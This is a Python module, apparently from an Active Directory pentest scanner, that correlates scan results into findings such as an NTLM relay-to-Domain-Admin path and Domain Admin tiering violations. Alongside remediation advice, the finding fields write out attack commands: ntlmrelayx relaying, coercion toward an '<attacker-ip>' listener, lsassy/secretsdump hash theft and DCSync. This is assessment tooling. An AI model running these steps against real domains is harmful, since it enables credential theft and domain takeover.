"""Bulgular arası korelasyon — tek tek zararsız görünen verileri birleştirip
yüksek-değerli bir saldırı/ihlal sinyaline çevirir.

Şimdilik: **tiering ihlali** — bir Domain Admin hesabının DC OLMAYAN bir host'ta
(iş istasyonu/üye sunucu) aktif oturumu. Bu, "o host'u ele geçir → DA token/hash
çal → domain" kısa yolu demektir ve tiered-admin modelinin ihlalidir.

Girdi tamamen `ScanReport` üzerindeki yapısal alanlardan gelir (`da_members`,
`sessions`, `dc_name`) — yeni komut çalıştırmaz; bu yüzden ek gürültü/maliyet yok.
"""

from __future__ import annotations

from .findings import Finding, ScanReport, Severity


def _is_dc_host(host: str, report: ScanReport) -> bool:
    """Host, tespit edilen DC mi? (DC'de DA oturumu normaldir, ihlal değil.)"""
    h = host.lower()
    dc = (report.dc_name or "").lower()
    if dc and (h == dc or h.startswith(dc + ".") or dc in h):
        return True
    # Hedef doğrudan DC ise ve host onu işaret ediyorsa
    tgt = report.target.split(",")[0].split("/")[0].strip().lower()
    return bool(tgt) and h == tgt


def correlate_clock_skew(report: ScanReport) -> Finding | None:
    """Herhangi bir modülün çıktısında Kerberos saat-kayması hatası kaldıysa
    (faketime uygulanamayan araç, ör. bloodhound-python) net bir uyarı bırakır.

    krbtime alt süreçleri libfaketime ile senkronlamaya çalışır; yoksa Kerberos
    akışları (kerberoast/certipy/PKINIT) sessizce NTLM'e düşer ya da patlar.
    """
    import re as _re
    blob = "\n".join(report.raw_outputs.values())
    if not _re.search(r"KRB_AP_ERR_SKEW|Clock skew too great|skew too great",
                      blob, _re.IGNORECASE):
        return None
    finding = Finding(
        title="Kerberos saat-kayması tespit edildi — bazı araçlar NTLM'e düştü/başarısız oldu",
        severity=Severity.INFO, target=report.target, source="correlate",
        control_id="kerberos.clock-skew",
        reference="KRB_AP_ERR_SKEW",
        description="En az bir araç KDC ile >5 dk saat farkı yüzünden Kerberos bileti "
                    "alamadı. Kerberoast/AS-REP/certipy (PKINIT) ve -k akışları eksik "
                    "veya güvenilmez çalışmış olabilir.",
        evidence="KRB_AP_ERR_SKEW / Clock skew too great (çıktıda görüldü)",
        remediation="Saati DC'ye senkronla: 'sudo ntpdate <DC>' veya 'sudo rdate -n <DC>'; "
                    "ya da adscan alt süreç senkronu için 'sudo apt install -y libfaketime' "
                    "(--no-clock-fix verilmediğinden emin ol).",
        poc=f"nxc smb {report.target}   # DC saatini gösterir; farkı ölç",
        escalation="Saat düzeltildikten sonra kerberoast/certipy adımlarını tekrar çalıştır.")
    report.add(finding)
    return finding


def correlate_ldap_confidential(report: ScanReport) -> Finding | None:
    """SAMR (rid-brute) çok daha fazla kullanıcı görüyorsa LDAP okuması kısıtlı
    demektir: hesaplar `confidential`/ACL ile gizlenmiş.

    Bu, kimlikli bir bind'in bile birçok nesneyi okuyamadığını gösterir —
    downstream enum (kerberoast/AS-REP/ACL) eksik kalır; o yüzden spray/roast
    için SAMR listesi tercih edilmelidir. Pratik, gerçek bir sinyal.
    """
    samr, ldap = report.samr_user_count, report.ldap_user_count
    if samr < 0 or ldap < 0:
        return None
    # Yalnız anlamlı fark: SAMR en az 3 kullanıcı ve LDAP'ın en az 2 katı kadar
    # fazlasını görüyorsa (tek kullanıcılı erişim hesapları tipik).
    if samr < 3 or samr < ldap * 2 or (samr - ldap) < 3:
        return None
    hidden = samr - ldap
    finding = Finding(
        title=f"LDAP okuması kısıtlı — {hidden} hesap gizli (SAMR {samr} vs LDAP {ldap})",
        severity=Severity.MEDIUM, target=report.target, source="correlate",
        control_id="ldap.confidential",
        reference="LDAP read restriction / confidential attributes",
        mitre="T1087.002",
        description="SAMR (rid-brute) ile görülen hesap sayısı, kimlikli LDAP bind'in "
                    "okuyabildiğinden belirgin fazla. Hesap nesneleri ACL/confidential "
                    "ile gizlenmiş; mevcut kimliğin görünürlüğü dar.",
        evidence=f"SAMR rid-brute: {samr} kullanıcı\nLDAP --users: {ldap} kullanıcı\n"
                 f"Gizli (okunamayan): ~{hidden}",
        remediation="Beklenen bir sertleştirmeyse not düş; değilse hangi principal'ın "
                    "hangi OU'yu okuyabildiğini denetle.",
        poc=f"nxc smb {report.target} -u <user> -p <pass> --rid-brute   # SAMR tam liste",
        escalation="Spray/AS-REP/kerberoast için SAMR listesini kullan (LDAP enum eksik). "
                   "Gizli kullanıcı adlarını kerbrute userenum ile doğrula.")
    report.add(finding)
    return finding


def correlate_relay_path(report: ScanReport) -> Finding | None:
    """Relay YÜZEYİ (LDAP signing/channel-binding zorlanmıyor) + COERCION primitifi
    (Spooler/WebDAV/PrinterBug) birlikteyse, uçtan uca NTLM relay-to-LDAP → DA
    zincirinin kullanılabilir olduğunu tek bir CRITICAL bulguda birleştirir.

    İki sinyal tek başına 'orta' görünür; birlikte bulunmaları doğrudan Domain
    Admin'e giden pratik bir yol demektir. Yeni komut çalıştırmaz (saf korelasyon).
    """
    relay_surface = [
        f for f in report.findings
        if f.control_id in ("ldap.signing.not-enforced",
                            "ldaps.channel-binding.not-enforced")]
    blob = "\n".join(
        f"{f.control_id} {f.title} {f.source}".lower() for f in report.findings)
    coercion = any(k in blob for k in (
        "spooler", "printerbug", "webdav", "petitpotam", "ms-rprn", "coerce"))
    if not relay_surface or not coercion:
        return None

    dc = report.dc_name or report.target
    surface_txt = ", ".join(sorted({f.control_id for f in relay_surface}))
    finding = Finding(
        title="Uçtan uca NTLM relay → Domain Admin yolu kullanılabilir "
              "(coercion + imzalama zorlanmıyor)",
        severity=Severity.CRITICAL, target=report.target, source="correlate",
        control_id="relay.coercion-to-da",
        reference="NTLM Relay to LDAP (RBCD / Shadow Credentials / AddComputer)",
        mitre="T1557.001",
        description="Bir coercion primitifi (Spooler/WebDAV/PrinterBug) bir DC/host'u "
                    "kimlik doğrulamaya zorlayabiliyor VE LDAP(S) imzalama/channel "
                    "binding zorlanmıyor. Zorlanan makine hesabı kimliği LDAP'a relay "
                    "edilip RBCD yazılabilir, shadow-credential eklenebilir veya makine "
                    "hesabı oluşturulabilir → hedefe yerel admin → DCSync → Domain Admin.",
        evidence=f"Relay yüzeyi: {surface_txt}\nCoercion primitifi: tespit edildi "
                 "(Spooler/WebDAV/PrinterBug çıktısı)",
        remediation="LDAP imzalamayı ve LDAPS channel binding'i (EPA) ZORLA; Print "
                    "Spooler'ı DC'lerde kapat; WebClient servisini kaldır; makine hesabı "
                    "oluşturma kotasını (MachineAccountQuota) 0 yap.",
        poc=f"# 1 (dinleyici): ntlmrelayx.py -t ldap://{dc} --delegate-access "
            "--no-dump\n# 2 (zorla):   nxc smb <DC> -M coerce_plus "
            "-o LISTENER=<attacker-ip>\n#   (adscan: adscan <DC> --active-attacks --launch)",
        escalation="RBCD yaz → S4U ile hedefe Administrator bileti → secretsdump → "
                   "DCSync. adscan 'relay' modülü bu zinciri --active-attacks --launch "
                   "ile kurar.")
    report.add(finding)
    return finding


def correlate_tiering(report: ScanReport) -> Finding | None:
    """DA hesabı DC-olmayan host'ta aktifse CRITICAL bir tiering-ihlali bulgusu üretir."""
    if not report.da_members or not report.sessions:
        return None
    da = {u.lower() for u in report.da_members}
    violations: list[str] = []
    for host, users in sorted(report.sessions.items()):
        if _is_dc_host(host, report):
            continue
        for u in users:
            if u.lower() in da:
                violations.append(f"{u} @ {host}")
    if not violations:
        return None
    finding = Finding(
        title=f"Tiering ihlali: Domain Admin iş istasyonunda/üye sunucuda aktif "
              f"({len(violations)})",
        severity=Severity.CRITICAL, target=report.target, source="correlate",
        description="Bir veya daha fazla Domain Admin hesabı DC OLMAYAN host'larda aktif "
                    "oturuma sahip. O host ele geçirilirse DA kimliği (token/hash/ticket) "
                    "doğrudan çalınır — tek adımda domain ele geçirme kısa yolu ve tiered-admin "
                    "modelinin ihlali.",
        evidence="\n".join(violations[:25]),
        remediation="DA hesaplarının iş istasyonu/üye sunucuda oturum açmasını engelleyin "
                    "(Protected Users, 'Deny log on' GPO, tiered admin / PAW); mevcut "
                    "oturumları kapatın ve ilgili parolaları döndürün.",
        reference="Tiering Violation / Credential Theft", mitre="T1078.002",
        poc="(korelasyon) DA üye listesi × --loggedon-users/--sessions çıktısı",
        escalation="1) İlgili host'ta yerel admin ol (reuse/Pwn3d): adscan <host> --reuse\n"
                   "2) nxc smb <host> -M lsassy (ya da secretsdump) ile DA token/hash'ini çal\n"
                   "3) Çalınan DA kimliğiyle DCSync -> Domain Admin.")
    report.add(finding)
    return finding
